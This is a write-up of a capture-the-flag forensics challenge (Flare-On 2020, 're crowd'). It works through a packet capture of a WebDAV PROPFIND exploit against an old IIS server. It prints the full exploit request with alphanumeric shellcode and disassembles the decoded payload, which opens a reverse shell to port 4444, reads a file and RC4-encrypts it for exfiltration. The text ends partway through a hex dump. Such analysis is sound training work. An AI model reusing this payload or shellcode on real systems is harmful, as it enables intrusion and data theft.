
## Flare-On 2020 - #7 re crowd
___

### Description: 

*Hello,*

*Here at Reynholm Industries we pride ourselves on everything. It's not easy to admit, but recently one of our most valuable servers was breached. We don't believe in host monitoring so all we have is a network packet capture. We need you to investigate and determine what data was extracted from the server, if any.*

*Thank you*

`*7zip password: flare`
___

### Solution:

In this challenge we have a `*.pcapng` file containing some network traffic. Initially there is
some HTTP traffic of a web forum (see [index.html](./index.html)). There is an interesting
discussion going on that reveals the flag location (it is stored in `C:\accounts.txt`):
```html
<p>Roy, Moss, look!! I made an IT Department web forum!!</p>
<p>Oh right, like we're supposed to believe that Jen.</p>
<p>Roy it's true. Richmond helped me learn on the weekends. Though I had to listen about that unbearable noise he calls music.</p>
<p>Cradle of Filth's Coffin Fodder really soothes the soul when learning to create a web forum.</p>
<p>At least she didn't use HTML tables.</p>
<p>Aww thanks Moss. Go on more about how you like it.</p>
<p>Team: Jen's new computer thing is fantastic. I want the rest of Reynholm Industries using it at once!</p>
<p>Jen. I hear other employees can't log in to this computer screen. Where are the logs kept? What kind are they, birch?</p>
<p>Moss, I need a list of employee's user names and passwords.</p>
<p>Jen, sending you that list would would go against our cybersecurity policy.</p>
<p>Jen. I emailed you a secret file containing a list of all our employee's usernames and passwords as well as favorite animal. Get them using this site.</p>
<p>Roy, can you help me create the accounts? I saved the file to C:\accounts.txt on the server.</p>
<p>Fine. Swing by my desk later. I'm not happy about this, not one bit.</p>
<p>Jen, that server seems awfully old. You might want to think about applying the latest security patches.</p>
<p>Moss. This doesn't feel like a quilt and besides I don't like patches. It holds water as it is.</p>
<p>Thanks Roy! All employees should now be able to access the web forum!</p>
```

After the HTTP traffic, there is a long back and forth of `PROPFIND` requests traffic.
Initially, client at `192.168.68.21` sends a `PROPFIND` on the main page (packet `118`)
which returns the following XML:
```xml
<?xml
    version="1.0"
    ?>
<a:multistatus
    xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/"
    xmlns:c="xml:"
    xmlns:a="DAV:">
    <a:response>
        <a:href>
            http://192.168.68.1/
            </a:href>
        <a:propstat>
            <a:status>
                HTTP/1.1 200 OK
                </a:status>
            <a:prop>
                <a:getcontentlength
                    b:dt="int">
                    0
                    </a:getcontentlength>
                <a:creationdate
                    b:dt="dateTime.tz">
                    2020-06-05T14:21:13.801Z
                    </a:creationdate>
                <a:displayname>
                    /
                    </a:displayname>
                <a:getetag>
                    "54af82a5443bd61:3b2"
                    </a:getetag>
                <a:getlastmodified
                    b:dt="dateTime.rfc1123">
                    Fri, 05 Jun 2020 14:21:47 GMT
                    </a:getlastmodified>
                <a:resourcetype>
                    <a:collection/>
                    </a:resourcetype>
                <a:supportedlock/>
                <a:ishidden
                    b:dt="boolean">
                    0
                    </a:ishidden>
                <a:iscollection
                    b:dt="boolean">
                    1
                    </a:iscollection>
                <a:getcontenttype/>
                </a:prop>
            </a:propstat>
        </a:response>
    </a:multistatus>
```

Then, client makes multiple `PROPFIND` requests that all result in the same `500` error:
```html
    <body><h1>HTTP/1.1 500 Internal Server Error(exception)</h1></body>
```

Each request has the same format with previous ones, except that it is 2 bytes shorter than the previous one.
A typical request looks like this:
```
PROPFIND / HTTP/1.1
Host: 192.168.68.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Length: 0
If: <http://192.168.68.1:80/AFRPWWBVQzHpAERtoPGOxDTKYBGmrxqhVCdIGMmNDzefUMySmeCdKhFobQXIDkhgEpnMeUniloxaFrfDCCBprACtWhHkrCVphXAmetqJqxATcnuåä¶å¥æ¡®ççæä©¥çäçæ©ç±å³ååÈÈáæ ä´ææ¥©ç©´å¹æ½åç¥ä³æ¥¸ç¥å¬ç¥¹ä½³ç¡æµ§æç¡æ½ä©áæ > (Not <locktoken:write1>) 

<http://192.168.68.1:80/oxamUvbohSEvpUpVuakwGpSnAQoMYMshqrvwwjFDLrhpIfQlgCdAlvwhrhCpWoKXCgOMkAbpjBnwLDdfCGcxCAyShpvGEmVwncZIIFDjgilqkGtäçäå¥¥ææ¢ä±¥äç°åäµ¬ç¨æ©æáæ ïç½ä©ä±åªä©áæ å©¡äçæ¥§ä¥æ¥ç¥´å¥ææ ë¬ç¼ïç¾â£ç»áçºïç»ääî¸¢ç»é ç¼â¥ç¾â£ç»é¯Ïíç½ä£ç»â ç¿ïç»ï°ç»ïç¾è°ç½è°ç½â£ç»éÏíç½èç»â£ç»ééæç¾å¹ìäVVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA>
```

However, at some point (packets `288` through `298`) a reverse shell opens at port `4444`
at `192.168.68.21` and some encrypted data are exchanged (which is probably the contents
of `C:\accounts.txt`).


From all the above, we can conclude that there is some form of attack going on. Attacker sends
multiple payloads with various lengths and crashes the server, which responds with a `500` error.
At some point the payload length is correct, exploit gets triggered and a reverse shell is spawned.


After some research, I found that this is a [WebDAV exploit](https://www.sans.org/security-resources/malwarefaq/webdav-exploit).
I also found [this PoC](https://github.com/danigargu/explodingcan/blob/master/explodingcan.py) that
explains in detail how the payload is constructed. Given that we analyze the correct payload
(packet `284`) that spawns the shell:
```
If: <http://192.168.68.1:80/
XLFLSAXPwyINBzZSTuZXSxVzmXBNTTAbvOAqueTvPJyCnjbjZhWzCZNfcmpBFsbXYNDzfLKSUMMxROxTkBmuagIimJaAoix....
...................................................................................................
.....................> (Not <locktoken:write1>) <http://192.168.68.1:80/lNYqwSlWgMxjvrdSMnCVVzDXcSf
MEAXYPPbLhsnupccYvkrOeuKrsULnBJzhmdORvBWTMDlpBnJVTyWPJuHafdRLOpTXLcF...............................
...................................................................................................
...................................................................................................
....................................VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAA
Z1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBk
PRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZ
xk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdI
q4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00
kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYo
pN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5i
oGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBL
D4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kK
N7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA> 
```

Payload consists of many random strings used as place holders. The first (which is random) is the
only part that varies in length. However, we are interested in the shellcode which starts from
`VVYAIAIAIAIAIAIAIA` and goes till the end of the packet. The interesting part of this ASCII
shellcode, is that it gets converted into UNICODE before it gets executed. This type of shellcode
is called *Venetial Shellcode* and [Phrack 61.11](http://phrack.org/issues/61/11.html#article)
shows how to write shellcode that is valid when it gets expanded into UNICODE. Therefore our
first task is to decode the shellcode into UNICODE and start emulating it using unicorn.
We use the script [decode_payload.py](./decode_payload.py) to get the following nice, 
clean disassembly listing (the full listing is at [decoded_payload.asm](./decoded_payload.asm)):
```Assembly
401000h 00 00                add    byte ptr [eax], al          ;
401002h 56                   push   esi                         ;
[ ... MODIFY PAYLOAD ...]
4010D1h 00 42 00             add    byte ptr [edx], al          ; This loop decodes the payload
4010D4h 41                   inc    ecx                         ; 
4010D5h 00 42 00             add    byte ptr [edx], al          ;
4010D8h 41                   inc    ecx                         ;
4010D9h 00 42 00             add    byte ptr [edx], al          ;
4010DCh 41                   inc    ecx                         ;
4010DDh 00 42 00             add    byte ptr [edx], al          ;
4010E0h 41                   inc    ecx                         ;
4010E1h 00 42 00             add    byte ptr [edx], al          ;
4010E4h 6B 01 10             imul   eax, dword ptr [ecx], 0x10  ;
4010E7h 02 41 02             add    al, byte ptr [ecx + 2]      ;
4010EAh 88 02                mov    byte ptr [edx], al          ;
4010ECh 42                   inc    edx                         ;
4010EDh 80 39 41             cmp    byte ptr [ecx], 0x41        ;

4010F0h 75 E2                jne    0x4010d4                    ;
4010F2h FC                   cld                                ;
4010F3h E8 82 00 00 00       call   0x40117a                    ; jump to the actual entry point
; -------------------------------------------------------------------------------------------------
; This function makes a library call
; -------------------------------------------------------------------------------------------------
4010F8h 60                   pushal                                 ;
4010F9h 89 E5                mov    ebp, esp                        ; prolog
4010FBh 31 C0                xor    eax, eax                        ; eax = 0
4010FDh 64 8B 50 30          mov    edx, dword ptr fs:[eax + 0x30]  ; edx = Process Environment Block (PEB)
401101h 8B 52 0C             mov    edx, dword ptr [edx + 0xc]      ; edx = PEB->Ldr (_PEB_LDR_DATA*) (get loaded modules)
401104h 8B 52 14             mov    edx, dword ptr [edx + 0x14]     ; edx = PEB->Ldr->InMemoryOrderModuleList (LDR_DATA_TABLE_ENTRY)

LOOP_1:                                                             ; (FullDllName is at +0x24 and has type UNICODE_STRING)
401107h 8B 72 28             mov    esi, dword ptr [edx + 0x28]     ; esi = edx->FullDllName->Buffer
40110Ah 0F B7 4A 26          movzx  ecx, word ptr [edx + 0x26]      ; ecx = edx->FullDllName->MaximumLength
; -----------------------------------------------------------------------------
; Calculate a checksum of the DLL name
; -----------------------------------------------------------------------------
40110Eh 31 FF                xor    edi, edi                        ; chk = 0
401110h AC                   lodsb  al, byte ptr [esi]              ; al = FullDllName[i++]
401111h 3C 61                cmp    al, 0x61                        ; if al < 'a' then don't upper()
401113h 7C 02                jl     0x401117                        ; 
401115h 2C 20                sub    al, 0x20                        ; al = upper(a)
401117h C1 CF 0D             ror    edi, 0xd                        ;
40111Ah 01 C7                add    edi, eax                        ; chk = ror(chk, 13) + upper(FullDllName[i++])
40111Ch E2 F2                loop   0x401110                        ;

40111Eh 52                   push   edx                             ; ebp-4 = PEB->Ldr->InMemoryOrderModuleList
40111Fh 57                   push   edi                             ; ebp-8 = chk
401120h 8B 52 10             mov    edx, dword ptr [edx + 0x10]     ; edx = edx->Flink
401123h 8B 4A 3C             mov    ecx, dword ptr [edx + 0x3c]     ; move on the next entry in the list
401126h 8B 4C 11 78          mov    ecx, dword ptr [ecx + edx+0x78] ;
40112Ah E3 48                jecxz  0x401174                        ;
40112Ch 01 D1                add    ecx, edx                        ;
40112Eh 51                   push   ecx                             ;
40112Fh 8B 59 20             mov    ebx, dword ptr [ecx + 0x20]     ;
401132h 01 D3                add    ebx, edx                        ;
401134h 8B 49 18             mov    ecx, dword ptr [ecx + 0x18]     ; ebx = EAT (exported function table) maybe?

401137h E3 3A                jecxz  0x401173                        ;
401139h 49                   dec    ecx                             ;
40113Ah 8B 34 8B             mov    esi, dword ptr [ebx + ecx*4]    ;
40113Dh 01 D6                add    esi, edx                        ; esi = function name ?

40113Fh 31 FF                xor    edi, edi                        ; chk2 = 0
401141h AC                   lodsb  al, byte ptr [esi]              ; al = func_name[i]
401142h C1 CF 0D             ror    edi, 0xd                        ;
401145h 01 C7                add    edi, eax                        ; chk2 = ror(chk2, 13) + func_name[i]
401147h 38 E0                cmp    al, ah                          ; if al != 0 get next character
401149h 75 F6                jne    0x401141                        ;

40114Bh 03 7D F8             add    edi, dword ptr [ebp - 8]        ; edi = chk + chk2
40114Eh 3B 7D 24             cmp    edi, dword ptr [ebp + 0x24]     ; chk + chk2 == hash?
401151h 75 E4                jne    0x401137                        ;

401153h 58                   pop    eax                             ;
401154h 8B 58 24             mov    ebx, dword ptr [eax + 0x24]     ;
401157h 01 D3                add    ebx, edx                        ;
401159h 66 8B 0C 4B          mov    cx, word ptr [ebx + ecx*2]      ;
40115Dh 8B 58 1C             mov    ebx, dword ptr [eax + 0x1c]     ;
401160h 01 D3                add    ebx, edx                        ;
401162h 8B 04 8B             mov    eax, dword ptr [ebx + ecx*4]    ;
401165h 01 D0                add    eax, edx                        ;
401167h 89 44 24 24          mov    dword ptr [esp + 0x24], eax     ;
40116Bh 5B                   pop    ebx                             ;
40116Ch 5B                   pop    ebx                             ;
40116Dh 61                   popal                                  ;
40116Eh 59                   pop    ecx                             ;
40116Fh 5A                   pop    edx                             ;
401170h 51                   push   ecx                             ; set the return value
401171h FF E0                jmp    eax                             ; invoke the DLL call

NOT_FOUND:
401173h 5F                   pop    edi                             ; not found. Try again.
401174h 5F                   pop    edi                             ;
401175h 5A                   pop    edx                             ;
401176h 8B 12                mov    edx, dword ptr [edx]            ;
401178h EB 8D                jmp    0x401107                        ; goto LOOP_1
; -------------------------------------------------------------------------------------------------
; ENTRY POINT
; -------------------------------------------------------------------------------------------------
40117Ah 5D                   pop    ebp                 ; ebp = return address = 0x4010F8
40117Bh 68 33 32 00 00       push   0x00003233          ;
401180h 68 77 73 32 5F       push   0x5f327377          ; 'ws2_32\0\0'
401185h 54                   push   esp                 ; arg1: add a pointer to 'ws2_32\0'
401186h 68 4C 77 26 07       push   0x0726774c          ; arg0: Checksum of target function
40118Bh FF D5                call   ebp

40118Dh B8 90 01 00 00       mov    eax, 0x190          ;
401192h 29 C4                sub    esp, eax            ; allocate a stack frame
401194h 54                   push   esp                 ;
401195h 50                   push   eax                 ;
401196h 68 29 80 6B 00       push   0x6b8029            ; WSAStartup?
40119Bh FF D5                call   ebp                 ; 

40119Dh 50                   push   eax                 ;
40119Eh 50                   push   eax                 ;
40119Fh 50                   push   eax                 ;
4011A0h 50                   push   eax                 ;
4011A1h 40                   inc    eax                 ;
4011A2h 50                   push   eax                 ;
4011A3h 40                   inc    eax                 ;
4011A4h 50                   push   eax                 ;
4011A5h 68 EA 0F DF E0       push   0xe0df0fea          ; socket()?
4011AAh FF D5                call   ebp                 ;

4011ACh 97                   xchg   eax, edi            ; edi = sock_fd
4011ADh 6A 05                push   5                   ;
4011AFh 68 C0 A8 44 15       push   0x1544a8c0          ;
4011B4h 68 02 00 11 5C       push   0x5c110002          ; 0x115c = 4444 port | c0 a8 44 15 = 192.168.68.21
4011B9h 89 E6                mov    esi, esp            ; esi = 02 00 11 5c c0 a8 44 15 05 00 00 00 (sockaddr)

LOOP_2:
4011BBh 6A 10                push   0x10                ; arg3: len
4011BDh 56                   push   esi                 ; arg2: &sokcaddr
4011BEh 57                   push   edi                 ; arg1: sock
4011BFh 68 99 A5 74 61       push   0x6174a599          ; connect()
4011C4h FF D5                call   ebp                 ;
4011C6h 85 C0                test   eax, eax
4011C8h 74 0C                je     0x4011d6

4011CAh FF 4E 08             dec    dword ptr [esi + 8] ; cannot connet. Try again
4011CDh 75 EC                jne    0x4011bb            ; goto LOOP_2
4011CFh 68 F0 B5 A2 56       push   0x56a2b5f0          ; exit()?
4011D4h FF D5                call   ebp                 ; 

; -----------------------------------------------------------------------------
; Connection is ok. Exchange data.
; -----------------------------------------------------------------------------
4011D6h 6A 00                push   0                           ; arg4: flags (0)
4011D8h 6A 04                push   4                           ; arg3: buflen (4 bytes)
4011DAh 56                   push   esi                         ; arg2: buf 
4011DBh 57                   push   edi                         ; arg1: sock_fd
4011DCh 68 02 D9 C8 5F       push   0x5fc8d902                  ; recv()
4011E1h FF D5                call   ebp                         ;

4011E3h 8B 36                mov    esi, dword ptr [esi]        ; esi = 4 received bytes (9C 5C 4F 52)
4011E5h 81 F6 4B 58 4F 52    xor    esi, 0x524f584b             ; 'KXOR' ^ (9C 5C 4F 52) = 0x4d7
4011EBh 8D 0E                lea    ecx, [esi]                  ; ecx = 0x4d7
4011EDh 6A 40                push   0x40                        ;
4011EFh 68 00 10 00 00       push   0x1000                      ; 
4011F4h 51                   push   ecx                         ; 0x4d7 (open HFILE handle?)
4011F5h 6A 00                push   0                           ; 
4011F7h 68 58 A4 53 E5       push   0xe553a458                  ; read from file or smth
4011FCh FF D5                call   ebp                         ;
4011FEh 8D 98 00 01 00 00    lea    ebx, [eax + 0x100]          ;
401204h 53                   push   ebx                         ;
401205h 56                   push   esi                         ;
401206h 50                   push   eax                         ;

LOOP_3:
401207h 6A 00                push   0                           ; arg4: flags
401209h 56                   push   esi                         ; arg3: buflen 
40120Ah 53                   push   ebx                         ; arg2: buf
40120Bh 57                   push   edi                         ; arg1: sock_fd
40120Ch 68 02 D9 C8 5F       push   0x5fc8d902                  ; send()
401211h FF D5                call   ebp                         ;
401213h 01 C3                add    ebx, eax                    ;
401215h 29 C6                sub    esi, eax                    ;
401217h 75 EE                jne    0x401207                    ; goto LOOP_4

401219h 5B                   pop    ebx                         ;
40121Ah 59                   pop    ecx                         ;
40121Bh 5D                   pop    ebp                         ;
40121Ch 55                   push   ebp                         ; ebp = ciphertext
40121Dh 57                   push   edi                         ;
40121Eh 89 DF                mov    edi, ebx                    ; arg1: keystream
401220h E8 10 00 00 00       call   0x401235                    ; call RC4

401225h 6B 69 6C 6C 65 72 76 75                                 ; decryption key!
40122Dh 6C 74 75 72 65 31 32 33                                 ; 'killervulture123'
; -------------------------------------------------------------------------------------------------
; RC4
; -------------------------------------------------------------------------------------------------
401235h 5E                   pop    esi                         ; esi = 0x401225 (key)
401236h 31 C0                xor    eax, eax                    ; store 0, 1, 2, 3, 4 ... 255
401238h AA                   stosb  byte ptr es:[edi], al       ; S[i] = i
401239h FE C0                inc    al
40123Bh 75 FB                jne    0x401238
40123Dh 81 EF 00 01 00 00    sub    edi, 0x100

401243h 31 DB                xor    ebx, ebx                    ;
401245h 02 1C 07             add    bl, byte ptr [edi + eax]    ; bl += S[i]
401248h 89 C2                mov    edx, eax                    ;  
40124Ah 80 E2 0F             and    dl, 0xf                     ; i = i % 16
40124Dh 02 1C 16             add    bl, byte ptr [esi + edx]    ; bl = bl + key[i % 16]
401250h 8A 14 07             mov    dl, byte ptr [edi + eax]    ; 
401253h 86 14 1F             xchg   byte ptr [edi + ebx], dl    ;
401256h 88 14 07             mov    byte ptr [edi + eax], dl    ;
401259h FE C0                inc    al                          ;   
40125Bh 75 E8                jne    0x401245

40125Dh 31 DB                xor    ebx, ebx                    ; ebx = 0
40125Fh FE C0                inc    al                          ;
401261h 02 1C 07             add    bl, byte ptr [edi + eax]    ; RC4!
401264h 8A 14 07             mov    dl, byte ptr [edi + eax]    ;
401267h 86 14 1F             xchg   byte ptr [edi + ebx], dl    ;
40126Ah 88 14 07             mov    byte ptr [edi + eax], dl    ;
40126Dh 02 14 1F             add    dl, byte ptr [edi + ebx]    ;
401270h 8A 14 17             mov    dl, byte ptr [edi + edx]    ;
401273h 30 55 00             xor    byte ptr [ebp], dl          ;
401276h 45                   inc    ebp                         ; 
401277h 49                   dec    ecx                         ;
401278h 75 E5                jne    0x40125f                    ;
40127Ah 5F                   pop    edi                         ;
40127Bh C3                   ret                                ;

[ANYTHING AFTER THIS IS USED AS DATA TO DECODE THE PREVIOUS CODE]
```

So the payload first reads 4 bytes (`9C 5C 4F 52`) and XORs them with the `KXOR` key to get the
value of `0x4d7`. This value is used as Windows HANDLE (I think) to read data from an (open) file.
After that, the contents are encrypting using RC4 with `killervulture123` as the key. The encrypted
file is the following (taken from packet `290`):
```
0030   -- -- -- -- -- -- -- -- -- -- a4 b1 03 73 90 e4
0040   c8 8e 97 b0 c9 5b c6 30 dc 6a bd f4 20 38 86 f9
0050   30 26 af ed d0 88 1b 92 4f e5 09 cd 5c 2e f5 e1
0060   68 f8 08 2b 48 da f7 59 9a d4 bb 92 19 ae 10 7b
0070   6e ed 7b 6d b1 85 4d 10 31 d2 8a 4e 7f 26 8b 10
0080   fd f4 1c c1 7f ab 5a 73 92 02 c0 cb 49 d9 53 d6
0090   df 6c 03 81 a0 21 01 6e 87 5f 09 fe 9a 69 94 35
00a0   84 4f 01 96 6e 77 ec a3 f3 f5 2f 6a 36 36 ab 47
00b0   75 b5 80 cb 47 bd 9f 76 38 a5 40 48 57 9c 36 ad
00c0   8e 79 45 a3 20 fa ed 1f 18 49 b8 89 18 48 2b 5b
00d0   6f ee f4 c3 d6 dc cc 84 ea b1 01 09 b1 31 4b a4
00e0   05 50 98 b0 73 ae 9c 14 10 1b 65 bd 93 82 6c 57
00f0   b9 75 7a 2a ee de 10 fb 39 ba 96 d0 36 1f c2 31
0100   2c c5 4f 33 a5 13 e1 59 56 92 c5 1f a5 4e 0e 62
0110   6e db 5b e8 7f 8d 01 a6 7d 01 2b 02 43 1f 54 b9
0120   bc d5 ef 2d b3 da ef 3d d0 68 fe da de 60 b1 17
0130   fe ea 20 4a 2c a1 bb a1 b5 c5 12 92 a9 db f1 11
0140   e3 8c 58 ba dc 3d 28 86 66 c8 6d 0e ab fa 83 d5
0150   24 60 10 68 1d c7 af c7 ac 45 13 a3 d9 72 e7 cc
0160   51 79 f5 67 41 7c ae 7f c8 7e 95 46 09 f6 ef 4b
0170   45 02 74 52 10 50 1c b7 6a 7c eb 00 d7 59 c3 29
0180   02 37 d0 47 2e 1e 3a f7 e6 ac 82 14 74 eb 4f 6b
0190   57 22 13 f6 f2 48 d6 6b cb b4 ed a7 32 68 cb d0
01a0   66 42 d3 c5 f2 c5 37 df 7d 9f 9f 28 c0 74 3a be
01b0   b8 c0 a7 73 d0 bb fa 50 7c 10 1e da b1 23 d6 c4
01c0   81 a5 d3 b6 22 29 09 6b 21 a6 5c 38 c6 80 3d be
01d0   08 23 c7 b1 1f 6d e6 64 66 95 dc 10 a7 13 42 cd
01e0   3b fa dc da 14 8d d0 5a c8 81 35 54 2f b5 dc 61
01f0   d6 28 77 88 c5 58 70 b5 2f cf ea 4f 4d 85 56 04
0200   07 f3 90 74 ce 5d 3c 8a 2b 06 b4 9f e6 6d 79 c0
0210   6e 3d d8 3e 20 08 b7 74 3d 36 99 cd 7f 60 7d 9c
0220   c9 b3 ad 0c 8e 45 6d ea 3d dd 09 1d da 0b 3a 1c
0230   fc cb 81 48 ed 5a fa ce f8 c6 23 b0 1e 26 44 a3
0240   d9 ab 0e d5 98 b1 33 65 5d ed 6a d3 23 7f 02 4a
0250   b3 a2 f8 1d 7e d1 2f 5f be 89 61 5e 2c e4 b8 96
0260   19 e5 49 76 4e 7a e8 92 a3 70 55 6f 7d 3c f9 c1
0270   36 44 69 33 7d df 79 37 b8 e0 aa e8 6a 5d c9 3b
0280   18 0f 4e 28 3a 31 a8 7f ef b8 19 ac 36 63 e8 89
0290   21 4d 83 a7 7e 57 03 48 9b e1 27 93 06 e4 3b 67
02a0   5f e5 69 50 00 3e 8b 01 b7 ef a6 b5 4b 36 82 d4
02b0   fb 9f de 8b 27 cc a4 57 ce 25 37 44 50 42 f7 7e
02c0   a2 bf 4f df 0f 72 d8 66 4a 3e f5 c8 26 2a c5 88
02d0   7b 97 ab 23 5b 2b 61 d8 3f 00 37 0e 7e 14 fa fd
02e0   7d f7 81 49 c2 a1 85 1b d0 28 be a5 24 fd 60 b2
02f0   78 27 4e ac e8 79 3b 3b 7a dc 56 d0 76 c5 01 0f
0300   cf 43 b5 d4 5f 48 70 bd ac 65 76 db 11 3b 5b cf
0310   9c 52 8b 00 1e 83 f1 fa 92 5b 77 79 07 6a e0 d4
0320   33 9a 71 ba 24 a5 a5 c8 eb 4c 01 b3 d3 cd 2c 22
0330   8c 0b 4c cd 2d 5a 8c 9a b1 67 70 7f 75 96 e2 56
0340   c1 1d ff 05 7e 77 a2 ba e5 9a ae f9 f8 b2 f1 78
0350   d2 b1 dc e9 03 c2 d4 ff 1f 66 cd b0 47 f0 b4 d1
0360   f6 72 fa 1e b7 f1 4d e7 6e 42 10 ec 5d 94 30 dd
0370   7f 75 1c 01 45 46 b6 14 6c f7 45 36 58 ec ef f3
0380   37 04 9c 21 eb 94 54 a3 fe 23 cb bb 31 5c 62 75
0390   bd ed 27 90 fe 91 17 e2 ae 42 9b 79 04 d1 5c ef
03a0   cd 4b 86 93 4a 74 41 2d ad 0b 35 1d 81 fd 10 2c
03b0   8e fd 8c 68 1d f5 45 0a b5 b4 09 be 0e fa fa d2
03c0   f7 4e 58 d8 3c 1a 1b 11 3d 99 25 53 ab 78 ac 54
03d0   49 bb 2a 42 b3 80 66 b5 63 e2 90 f8 a5 8f 37 af
03e0   97 13 2b e8 fc 5d 4b 71 8b 4d 9f c8 ec 07 28 1f
03f0   cb 30 92 1e 6d dc b9 de 94 b8 e9 cb 5a f7 a2 b0
0400   bb 0f c3 38 b7 27 33 1b e9 bf 45 2d 86 3e 34 6d
0410   12 f6 05 12 27 c5 28 e4 d2 61 26 7e 99 2b 3f 1f
0420   03 4d 79 72 b9 83 56 6d 8e 82 33 c2 09 eb 21 4a
0430   0c 13 ad ea 29 1b 58 da 10 16 43 20 55 7d f4 b7
0440   fc 26 34 68 8b a0 54 af 07 d5 d5 23 b5 23 b8 fb
0450   07 c6 64 4a 56 7f a0 6d 86 7c 33 3b 23 b7 9d 9c
0460   a8 22 b1 79 9f 00 e7 76 e9 c7 68 ae 5c 23 ae 9f
0470   c6 45 91 48 83 6f bf 0a d8 c9 77 ab 2c 2d 85 47
0480   bf e9 81 80 13 d9 dc 1c 21 0f f4 c7 79 07 52 a8
0490   06 8c 57 63 53 b2 fb 7d be 6c 1a ae 2e bd c6 fd
04a0   97 0a 04 ed c0 a3 05 45 db 9b 62 bd 34 a9 08 25
04b0   53 00 90 36 cf d9 63 15 a5 f7 f8 e0 d8 69 fd 79
04c0   24 60 7b a2 ae bd f2 b4 b9 c2 08 84 65 a9 6d eb
04d0   a5 d8 72 a7 b6 59 21 b9 f4 11 12 5d 39 1d 15 75
04e0   6d 8a 2f 58 c2 fc 80 02 51 78 a9 fc 7d de 0d 85
04f0   a5 57 18 f8 f0 cc 8e 4c 5e d7 65 58 74 4e 8a 44
0500   33 a2 24 e3 56 57 68 ba bb f2 b2 32 98 f1 88 2e
0510   c3
```

Although the decryption of this file makes no sense, there is an interesting string (`/IC:\accounts.txtintrepidmango`) at the end:
```
��d$��X�@��E��E���m�E�E���y�E�j�E�E������u���KP�E���m�Q���t�Ã���E�3��
              0�����E��$������_^[�SVWU��d$��E��U�d�0�@               �E�����Ѓ�t����Ӌ�σ��������SVWU��d$�E����M�3ۋE�;�r�#����Ê�E�E���ȊE�2�������_^[�SVWU��d$��؉U���3Ɂ�r��Ë�ы������3�3Ɂ�r�J3ҋ����E�������������������E��Ë�ы�Ɗ��Ë�֊E�����ƃƃ�_^[�SVWU��d$��Њ���������Ɗ؈�������Ɗ�E����������Ǌ�E��E��������E���                                        �H
��      ��3�f3��3��_^[�f�A,f;��&f�������                �A��t
��� �����ƋY�C<��ЋBx��Ћ  E�3ҋE�@;�r녃���E�@ ����ƍ�����3��ǃ�����E��E���t�  �E�;�t�ċ���
  Ƌ��E���͋E�@��ȋE�@$����ƍPf������؋��_^[�SVWU��d$�E��U��^������jjj��y�P�؃�|����_^[Í}�2�jY�f�E��E�f�f�E�E�ȉE�E�jPS��y�P��|��_^[Ë��_^[�SVWU�썤$h����^��_������jjjjjh�P��m��Ѝ�h�����h���jPhQR��m�������l�����2�3�I���I���������l�����h�����h����p�����p���Ph��y��D��f�9������؍�h���j��h���PS��y�jS��y�P
       �_^[��+n�|~��se����2���;���`�p��j_Mn
                                           /IC:\accounts.txtintrepidmango
```

According to the initial discussion in the web forum, `intrepidmango` is probably the decryption
key for the other file (the packet `294`), which is the `C:\acounts.txt`:
```
0030   -- -- -- -- -- -- 43 66 57 83 a5 23 89 77 be ac
0040   1b 1f 87 8f 58 93 3f 24 cf 2c d3 9a a8 d1 11 c4
0050   bc a6 7f cd 38 db b3 3c 03 4b ab f5 60 c5 60 d2
